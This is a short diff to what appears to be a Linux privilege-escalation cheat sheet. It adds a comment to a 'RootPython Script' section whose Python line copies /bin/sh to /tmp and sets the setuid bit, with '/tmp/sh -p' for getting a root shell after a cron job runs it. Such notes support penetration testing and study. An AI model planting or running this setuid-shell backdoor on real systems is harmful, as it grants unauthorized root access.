@@ -210,7 +210,8 @@ default /usr/bin:/bin
 ### RootPython Script    
 
     import os    
-    os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")    
+    os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")   
+    #post cronjob run: /tmp/sh -p      
 ### Wildcards 
 [Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 
 
